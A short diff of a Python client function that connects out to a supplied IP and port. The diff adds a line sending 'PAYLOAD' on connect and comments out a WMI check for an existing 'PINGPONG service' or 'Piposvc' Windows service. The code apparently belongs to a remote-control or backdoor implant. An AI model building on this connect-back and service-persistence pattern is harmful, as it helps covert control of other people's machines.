@@ -38,6 +38,7 @@ def PINGPONG_client_T(ip, port):
             s.connect((ip, port))
         except socket.error:
             sys.exit(1)
+        s.send(bytes('PAYLOAD', 'utf8'))
         while True:
             data = s.recv(1024)
             # usage 
@@ -303,7 +304,7 @@ def PINGPONG_client_T(ip, port):
                         random_str += base_str[randint(0, length)]
                     return random_str
                 dir_name = generate_random_str()
-                servise_before_adding = _wmi.Win32_Service()
+                # servise_before_adding = _wmi.Win32_Service()
                 # for i in servise_before_adding:
                 #     if 'PINGPONG service' in i.name or 'Piposvc' in i.name:
                 #         s.send(bytes('HAVEIT', 'utf8'))
